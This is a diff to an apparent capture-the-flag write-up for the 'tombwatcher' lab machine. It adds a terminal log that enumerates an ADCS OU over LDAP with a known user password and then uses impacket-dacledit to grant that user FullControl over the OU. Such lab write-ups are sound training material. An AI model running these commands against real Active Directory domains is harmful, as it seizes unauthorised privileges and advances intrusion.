@@ -419,7 +419,42 @@ b3438e9f759311d129b2b03ecaaa313f
 
 ### Enumeration
 
-What you found that leads to root/admin.
+```
+ netexec ldap 10.129.144.23 -u john -p 'newP@ssword2022' --query "(ou=ADCS)" ""
+LDAP        10.129.144.23   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
+LDAP        10.129.144.23   389    DC01             [+] tombwatcher.htb\john:newP@ssword2022 
+LDAP        10.129.144.23   389    DC01             [+] Response for object: OU=ADCS,DC=tombwatcher,DC=htb
+LDAP        10.129.144.23   389    DC01             objectClass          top
+LDAP        10.129.144.23   389    DC01                                  organizationalUnit
+LDAP        10.129.144.23   389    DC01             ou                   ADCS
+LDAP        10.129.144.23   389    DC01             distinguishedName    OU=ADCS,DC=tombwatcher,DC=htb
+LDAP        10.129.144.23   389    DC01             instanceType         4
+LDAP        10.129.144.23   389    DC01             whenCreated          20241116005559.0Z
+LDAP        10.129.144.23   389    DC01             whenChanged          20241116005605.0Z
+LDAP        10.129.144.23   389    DC01             uSNCreated           12839
+LDAP        10.129.144.23   389    DC01             uSNChanged           12856
+LDAP        10.129.144.23   389    DC01             name                 ADCS
+LDAP        10.129.144.23   389    DC01             objectGUID           4bcc54be-f3f7-6940-9085-18d905ff7a31
+LDAP        10.129.144.23   389    DC01             objectCategory       CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=tombwatcher,DC=htb
+LDAP        10.129.144.23   389    DC01             dSCorePropagationData 20241116170710.0Z
+LDAP        10.129.144.23   389    DC01                                  20241116170708.0Z
+LDAP        10.129.144.23   389    DC01                                  20241116170705.0Z
+LDAP        10.129.144.23   389    DC01                                  20241116170418.0Z
+LDAP        10.129.144.23   389    DC01                                  16010101000000.0Z
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/machines/tombwatcher]
+└─$ impacket-dacledit -action write -rights FullControl -inheritance \
+  -principal 'john' -target-dn 'OU=ADCS,DC=tombwatcher,DC=htb' \
+  'tombwatcher.htb/john:newP@ssword2022' -dc-ip 10.129.144.23
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
+/usr/share/doc/python3-impacket/examples/dacledit.py:390: DeprecationWarning: codecs.open() is deprecated. Use open() instead.
+  with codecs.open(self.filename, 'w', 'utf-8') as outfile:
+[*] DACL backed up to dacledit-20260924-071602.bak
+[*] DACL modified successfully!
+
+```
 
 ### Exploitation
 
